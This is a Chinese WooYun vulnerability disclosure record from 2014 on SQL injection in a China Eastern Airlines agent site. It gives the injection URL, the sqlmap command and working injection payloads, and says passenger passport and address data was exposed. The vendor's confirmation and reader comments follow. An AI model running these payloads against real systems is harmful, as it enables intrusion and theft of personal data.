{"id": 1298, "wybug_id": "wooyun-2014-071011", "wybug_title": "东方航空公司SQL注入漏洞大量乘客信息泄露", "wybug_corp": "中国东方航空股份有限公司", "wybug_author": "进击的zjx", "wybug_date": "2014-08-04 19:22", "wybug_open_date": "2014-09-18 19:24", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-18：\t细节向公众公开  简要描述： 这是个捡漏。。 详细说明：  附上原帖链接： WooYun: 东方航空机票代理分销列目录+SQL注入 针对目录非授权访问已经修复，但是庞大的数据库信息却置若罔闻！附上注入点http://muagent-hk.ceair.com/test/a/user_detail.aspx?usrId=0003\n\n放进sqlmap里面跑一下，盲注。\nC:\\Python27\\sqlmap>sqlmap.py -u http://muagent-hk.ceair.com/test/a/user_detail.aspx?usrId=0003 --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 18:25:01[18:25:01] [INFO] resuming back-end DBMS 'microsoft sql server'[18:25:01] [INFO] testing connection to the target URL[18:25:01] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the testssqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: usrId    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: usrId=0003' AND 9385=9385 AND 'FCRd'='FCRd    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: usrId=0003' AND 1960=CONVERT(INT,(SELECT CHAR(113)+CHAR(116)+CHAR(122)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (1960=1960) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(97)+CHAR(98)+CHAR(120)+CHAR(113))) AND 'ermI'='ermI    Type: UNION query    Title: Generic UNION query (NULL) - 19 columns    Payload: usrId=0003' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(116)+CHAR(122)+CHAR(113)+CHAR(113)+CHAR(104)+CHAR(122)+CHAR(117)+CHAR(70)+CHAR(111)+CHAR(106)+CHAR(70)+CHAR(86)+CHAR(116)+CHAR(77)+CHAR(113)+CHAR(97)+CHAR(98)+CHAR(120)+CHAR(113),NULL--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: usrId=-9104' OR 9204=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'OwKj'='OwKj---[18:25:01] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[18:25:01] [INFO] fetching database namesavailable databases [1]:[*] master\n用sqlmap.py跑，只能跑出一个数据库，并且其中也只有几个无用的表。既然依然存在注入点，那么不可能就这点东西啊。看似厂商进行了一些有效修复，其实不然。不死心，用另一款工具跑了下。果然跑出来接近700个表！   漏洞证明：  用safe3si跑的图，697个表！\n\n乘客信息惨不忍睹的暴露无遗。包括姓名，出生日期，护照ID，地址等等！忘引起重视尽快修复！   修复方案：  代码过滤，预编译，数据和代码分离等等……   版权声明：转载请注明来源 进击的zjx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-08-06 08:54 厂商回复： 已处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-05 13:45 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:61        | 工作需要，暂别一段时间)\t\t \n  第一次上首页    \n     2014-09-19 01:36 |    \t\tAnnabelle \t\t\t( 实习白帽子  |\t\t\t        Rank:46 漏洞数:15        | .)\t\t \n  喜闻乐见，叫你延误航班！回去告诉我们家小旋子让他来围观，哈哈哈哈哈~    \n     2014-09-20 00:38 |    \t\twangy3e \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | web security,mobile app security)\t\t \n  你不抱出数据 人家不care    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}